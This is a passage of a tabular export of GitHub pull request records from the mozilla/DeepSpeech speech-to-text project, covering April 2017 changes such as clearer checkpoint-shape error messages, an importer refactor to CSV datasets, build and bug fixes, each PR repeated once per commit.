                                               checkpoint_dir=FLAGS.checkpoint_dir,
                                               save_checkpoint_secs=FLAGS.checkpoint_secs,
                                               config=session_config) as session:
```
and catch 
```
    except tf.errors.InvalidArgumentError:
        log_error(sys.exc_info()[1])
        log_error(""Provide a --checkpoint_dir argument to work with a model with different shapes."")
```

cons's:
- I am not sure if this is the best/cleanest/most efficient way to handle this.
- Not as efficient as checking the checkpoint parameters. I am not sure how this impacts performance for python but I am pretty sure this will only be taken into account for 1 loop.
- Looks bad.

pro's:
- we return the exception from TF but provide information to Deep Speech users on how to mitigate this issue at the bottom.

We could do a check to make sure the variables match before using the MonitoredTrainingSession, but it seems as though this would require creating a separate session manager which seems overly complicated given this function to auto handle sessions. ",crs117,1690117,2017-04-09T23:53:58Z,CONTRIBUTOR,True,89,74,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82a0a4bf03701e31844e5b5cc06bb68b5597c348,"Print a more useful error message when we fail to restore the saved weights due to mismatching model shapes

The documentation in the README.md can be updated so that search engines can point here for this issue.

pro's:

    No change to code.
    People will discover that default checkpoints can this error by mixing models with different shapes.

con's:

    Other people may associate this error with Deep Speech itself. (either way people find what may be triggering this in TF)

Change the empty flag behavior for ""checkpoint_dir"" to work more like ""dataset_path"" by adding the importer name as a separate folder inside the default directory

if len(FLAGS.checkpoint_dir) == 0:
        FLAGS.checkpoint_dir = xdg.save_data_path(os.path.join('deepspeech','checkpoints',FLAGS.importer))

pro's:

    Creates a new checkpoint folder automatically for each script

con's:

    I am not sure how people are using this tool, but it changes the default behavior and may cause confusion for other folks that may run custom scripts.

Add a try to except clause around

with tf.train.MonitoredTrainingSession(master='' if server is None else server.target,
                                               is_chief=is_chief,
                                               hooks=hooks,
                                               checkpoint_dir=FLAGS.checkpoint_dir,
                                               save_checkpoint_secs=FLAGS.checkpoint_secs,
                                               config=session_config) as session:

and catch

    except tf.errors.InvalidArgumentError:
        log_error(sys.exc_info()[1])
        log_error(""Provide a --checkpoint_dir argument to work with a model with different shapes."")

cons's:

    I am not sure if this is the best/cleanest/most efficient way to handle this.
    Not as efficient as checking the checkpoint parameters. I am not sure how this impacts performance for python but I am pretty sure this will only be taken into account for 1 loop.
    Looks bad.

pro's:

    we return the exception from TF but provide information to Deep Speech users on how to mitigate this issue at the bottom.

We could do a check to make sure the variables match before using the MonitoredTrainingSession, but it seems as though this would require creating a separate session manager which seems overly complicated given this function to auto handle sessions."
3839,https://api.github.com/repos/mozilla/DeepSpeech/pulls/512,512,fix for issue 511,"@reuben 

If I understood this was the right solution. From the original post below I have added the try catch around the ""with tf.train.MonitoredTrainingSession"" call in train.  The message I am providing the user may need to be adjusted to make it better and I am open to suggestions/corrections. 

The original post below describes my reasoning for this proposed changed. I hope I did this correctly.

The documentation in the README.md can be updated so that search engines can point here for this issue.

pro's:
-  No change to code. 
-  People will discover that default checkpoints can this error by mixing models with different shapes.

con's:
- Other people may associate this error with Deep Speech itself. (either way people find what may be triggering this in TF)

Change the empty flag behavior for ""checkpoint_dir"" to work more like ""dataset_path"" by adding the importer name as a separate folder inside the default directory

```
if len(FLAGS.checkpoint_dir) == 0:
        FLAGS.checkpoint_dir = xdg.save_data_path(os.path.join('deepspeech','checkpoints',FLAGS.importer))
```
pro's:
- Creates a new checkpoint folder automatically for each script

con's: 
- I am not sure how people are using this tool, but it changes the default behavior and may cause confusion for other folks that may run custom scripts.

Add a try to except clause around
```
with tf.train.MonitoredTrainingSession(master='' if server is None else server.target,
                                               is_chief=is_chief,
                                               hooks=hooks,
                                               checkpoint_dir=FLAGS.checkpoint_dir,
                                               save_checkpoint_secs=FLAGS.checkpoint_secs,
                                               config=session_config) as session:
```
and catch 
```
    except tf.errors.InvalidArgumentError:
        log_error(sys.exc_info()[1])
        log_error(""Provide a --checkpoint_dir argument to work with a model with different shapes."")
```

cons's:
- I am not sure if this is the best/cleanest/most efficient way to handle this.
- Not as efficient as checking the checkpoint parameters. I am not sure how this impacts performance for python but I am pretty sure this will only be taken into account for 1 loop.
- Looks bad.

pro's:
- we return the exception from TF but provide information to Deep Speech users on how to mitigate this issue at the bottom.

We could do a check to make sure the variables match before using the MonitoredTrainingSession, but it seems as though this would require creating a separate session manager which seems overly complicated given this function to auto handle sessions. ",crs117,1690117,2017-04-09T23:53:58Z,CONTRIBUTOR,True,89,74,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f1356cedcc3a1fb854ecad3a9e340fcd141eb53,"Print a more useful error message when we fail to restore the saved weights due to mismatching model shapes

The documentation in the README.md can be updated so that search engines can point here for this issue.

pro's:

    No change to code.
    People will discover that default checkpoints can this error by mixing models with different shapes.

con's:

    Other people may associate this error with Deep Speech itself. (either way people find what may be triggering this in TF)

Change the empty flag behavior for ""checkpoint_dir"" to work more like ""dataset_path"" by adding the importer name as a separate folder inside the default directory

if len(FLAGS.checkpoint_dir) == 0:
        FLAGS.checkpoint_dir = xdg.save_data_path(os.path.join('deepspeech','checkpoints',FLAGS.importer))

pro's:

    Creates a new checkpoint folder automatically for each script

con's:

    I am not sure how people are using this tool, but it changes the default behavior and may cause confusion for other folks that may run custom scripts.

Add a try to except clause around

with tf.train.MonitoredTrainingSession(master='' if server is None else server.target,
                                               is_chief=is_chief,
                                               hooks=hooks,
                                               checkpoint_dir=FLAGS.checkpoint_dir,
                                               save_checkpoint_secs=FLAGS.checkpoint_secs,
                                               config=session_config) as session:

and catch

    except tf.errors.InvalidArgumentError:
        log_error(sys.exc_info()[1])
        log_error(""Provide a --checkpoint_dir argument to work with a model with different shapes."")

cons's:

    I am not sure if this is the best/cleanest/most efficient way to handle this.
    Not as efficient as checking the checkpoint parameters. I am not sure how this impacts performance for python but I am pretty sure this will only be taken into account for 1 loop.
    Looks bad.

pro's:

    we return the exception from TF but provide information to Deep Speech users on how to mitigate this issue at the bottom.

We could do a check to make sure the variables match before using the MonitoredTrainingSession, but it seems as though this would require creating a separate session manager which seems overly complicated given this function to auto handle sessions."
3840,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2da9e7849f05977a1e4dfc8c9d33e8439b2e0be0,"Process corpora in a single pass when possible, and save their definition in CSV files for performance and cleaner code."
3841,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bdef35dbb222cd816efa01f58cfa29c287095734,Refactor DataSet class out of importers since they're all identical now
3842,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c64846e75af4c20665ef399d492b6dd01f0b516,Extract logic for loading preprocessed dataset files from the importers and decouple main script from importers
3843,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b2b220b2c43221892ecb46c5fe8f81055915427,Make importers work as independent scripts that generate CSVs with the preprocessed dataset information
3844,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7bfbc8aff694b8812ab3798b866d2cb8cc9ae86f,Fix spacing and add importer path to error message in bin/run-* scripts
3845,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83a690ba874f884a837e8d3feaf0e36df66c1b6f,"Use comma separated list for {train,dev,test}_files arguments"
3846,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d7b543c11fc1fac96a1a3e3074427ff3804fc47,Re-add comment about a Python 3 requirement
3847,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2731a3e9e331aa712544bd4c7e1938b8f46bf0d,Remove redundant float conversions since we use __future__.division now
3848,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53c1f3a5794f02e92dc59aa885db7d263370b2af,Move importer scripts to bin/
3849,https://api.github.com/repos/mozilla/DeepSpeech/pulls/506,506,Importer cleanup,"This is the big importer refactor. The commits are organized in a way that the repository still works after each one is applied. The largest changes are in commit d1fabe0bbca738981c1840d3b6a278787ef4f83b, the first one, which tries to do a single pass over the corpora where possible. In practice, this means audio and transcriptions are split in the same pass. In addition, it also adds code to save the dataset definition in CSV files, and read/handle them using [pandas](http://pandas.pydata.org/).

Commit a88e4ae2f31bc45d073c6e57adc618c6ce5468bd simply refactors the DataSet class into util/data_set_helpers.py, as all the importers have identical implementations now.

Then comes commit c4ed81ce43d52ff3674ee3d49626acb888420120, which makes the main script read the .csv files directly instead of calling into the importer.

Finally, commit 6133ef3b70813c77d2f9d182fbc1944168a056fb changes the importers to be scripts that work independently from the main script. The work flow from zero to training on say, LibriSpeech, is now something like:
```
python util/importers/librivox.py path/to/destination/folder
python DeepSpeech.py --train_files path/to/destination/folder/librivox-train-clean-100.csv --dev_files path/to/destination/folder/librivox-dev-clean.csv --test_files path/to/destination/folder/librivox-test.clean.csv
```

I'm gonna add pandas to requirements.txt and update the README tomorrow. I tested this code with LDC93S1 and LibriSpeech, but couldn't test with TED-LIUM as the archive on the server seems to be corrupted.",reuben,477142,2017-04-07T03:01:47Z,MEMBER,True,956,1476,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5c3478b8d80e573b83c33b948831a27444f2023,Clean up confusing code in DataSet by removing a redundant member variable
3850,https://api.github.com/repos/mozilla/DeepSpeech/pulls/505,505,Fixed #504,,kdavis-mozilla,12054740,2017-04-07T01:34:12Z,CONTRIBUTOR,True,37,37,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,14bf57a44f7ccc660029b2164cb2c330c3f2c513,Fixed #504
3851,https://api.github.com/repos/mozilla/DeepSpeech/pulls/499,499,Building DeepSpeech on TaskCluster,,lissyx,1645737,2017-04-05T08:34:57Z,COLLABORATOR,True,343,2,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4eb42f1d8ecdac1fcdd3db7022be5f5a7f35b180,Building DeepSpeech on TaskCluster
3852,https://api.github.com/repos/mozilla/DeepSpeech/pulls/497,497,Remove serving client and demos (Fixes #496),As discussed in Berlin.,reuben,477142,2017-04-04T17:48:26Z,MEMBER,True,0,680,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2cf984360ecc26aece39de91f02916802b6a3420,Remove serving client and demos
3853,https://api.github.com/repos/mozilla/DeepSpeech/pulls/495,495,Updated the Hyperparameters in run-librivox.sh,,baljeet,2904037,2017-04-04T12:55:46Z,CONTRIBUTOR,True,9,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,270b8beda5d4357acc895d34c45b0461fc8e54ae,updated the hyperparameters as per the issue 333
3854,https://api.github.com/repos/mozilla/DeepSpeech/pulls/495,495,Updated the Hyperparameters in run-librivox.sh,,baljeet,2904037,2017-04-04T12:55:46Z,CONTRIBUTOR,True,9,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95ee4294adc91b68840acb9ba2d7d76a57ee7b69,updated the hyperparameters as per the issue 333
3855,https://api.github.com/repos/mozilla/DeepSpeech/pulls/495,495,Updated the Hyperparameters in run-librivox.sh,,baljeet,2904037,2017-04-04T12:55:46Z,CONTRIBUTOR,True,9,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,653f37d46b0bf8bc395e14b9c02aa275917d021d,fixed parameter name in run-librivox
3856,https://api.github.com/repos/mozilla/DeepSpeech/pulls/494,494,Minor fixes,,tilmankamp,5991088,2017-04-04T10:11:12Z,CONTRIBUTOR,True,2,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b763bc7ab48230980dc79dab956aa7c7922865b5,Minor fixes
3857,https://api.github.com/repos/mozilla/DeepSpeech/pulls/486,486,make run-ted.sh store to data instead of /data,"`bin/run-ted.sh` was referring to `/data/LIUM`, when what it means is `data/LIUM`.",ghost,10137,2017-04-02T06:21:28Z,NONE,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5e702c6a26e0d615bd1a5d585660fb95718e4d2,make run-ted.sh store to data instead of /data
3858,https://api.github.com/repos/mozilla/DeepSpeech/pulls/486,486,make run-ted.sh store to data instead of /data,"`bin/run-ted.sh` was referring to `/data/LIUM`, when what it means is `data/LIUM`.",ghost,10137,2017-04-02T06:21:28Z,NONE,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea316d51135754685b8a7b3f95f084f41125adf6,dataset_path defaults to data/<importer> anyway
3859,https://api.github.com/repos/mozilla/DeepSpeech/pulls/485,485,Fix _example_queue in data_set_helpers to be example_queue as named in the importers,"`util/data_set_helpers.py` `SwitchableDataSet.__init__`'s line:
`self._queues = [s._example_queue for s in self._sets]` seems to mean `.example_queue`, since that's what is defined in every importer.

Culprit traceback before this patch:
``` bash
[mike@self DeepSpeech] $ ./bin/run-ldc93s1.sh 
+ '[' '!' -f DeepSpeech.py ']'
+ python -u DeepSpeech.py --importer ldc93s1 --train_batch_size 1 --dev_batch_size 1 --test_batch_size 1 --n_hidden 494 --epoch 50
Traceback (most recent call last):
  File ""DeepSpeech.py"", line 1646, in <module>
    tf.app.run()
  File ""/home/mike/projects/rnn/DeepSpeech/env/lib/python2.7/site-packages/tensorflow/python/platform/app.py"", line 44, in run
    _sys.exit(main(_sys.argv[:1] + flags_passthrough))
  File ""DeepSpeech.py"", line 1609, in main
    train()
  File ""DeepSpeech.py"", line 1379, in train
    switchable_data_set = SwitchableDataSet(data_sets)
  File ""/home/mike/projects/rnn/DeepSpeech/util/data_set_helpers.py"", line 47, in __init__
    self._queues = [s._example_queue for s in self._sets]
AttributeError: 'DataSet' object has no attribute '_example_queue'
```",ghost,10137,2017-04-02T06:18:13Z,NONE,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ff223a132525eda1b2f7b9fa4660620baec2ce5,fix _example_queue to be example_queue as named in the importers
3860,https://api.github.com/repos/mozilla/DeepSpeech/pulls/484,484,Fixed #483,,kdavis-mozilla,12054740,2017-04-01T12:05:40Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d4e227d4a955c3bf6110204b1a295ab1a6e98f6,Fixed #483
3861,https://api.github.com/repos/mozilla/DeepSpeech/pulls/482,482,Fixed #481,,kdavis-mozilla,12054740,2017-04-01T11:36:57Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c1c46ac46b8c0a576ec758830c46acf3356a1a7,Fixed #481
3862,https://api.github.com/repos/mozilla/DeepSpeech/pulls/478,478,Fix #328; distributed TensorFlow,,tilmankamp,5991088,2017-03-29T16:48:03Z,CONTRIBUTOR,True,1666,1394,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d21d0cbd2e86ef2e0540e70190fc833ce6e4663,Fix #328; distributed TensorFlow
3863,https://api.github.com/repos/mozilla/DeepSpeech/pulls/476,476,Limit libdeepspeech -> tensorflow deps,"On my desktop, makes a `bazel build -c opt [...] //native_client:*`
after a `bazel clean` running in ~150 secs instead of 560 secs.

Fixes #475",lissyx,1645737,2017-03-29T10:35:25Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,feebc7d058ef51fdbc186e325e15d28d3c5a45c4,"Limit libdeepspeech -> tensorflow deps

On my desktop, makes a `bazel build -c opt [...] //native_client:*`
after a `bazel clean` running in ~150 secs instead of 560 secs.

Fixes #475"
3864,https://api.github.com/repos/mozilla/DeepSpeech/pulls/474,474,Pass correct input_lengths value as a Tensor to Session::Run(),Fixes #473,lissyx,1645737,2017-03-29T09:40:22Z,COLLABORATOR,True,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b726c5c91aef3d7df69fd2e71b91b7763d061c75,"Pass correct input_lengths value as a Tensor to Session::Run()

Fixes #473"
3865,https://api.github.com/repos/mozilla/DeepSpeech/pulls/470,470,Export graph should take sequence lengths as input,Fixes #381.,reuben,477142,2017-03-28T14:44:39Z,MEMBER,True,4,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07620c4779c4ce4015604247fea9252973863b66,Export graph should take sequence lengths as input
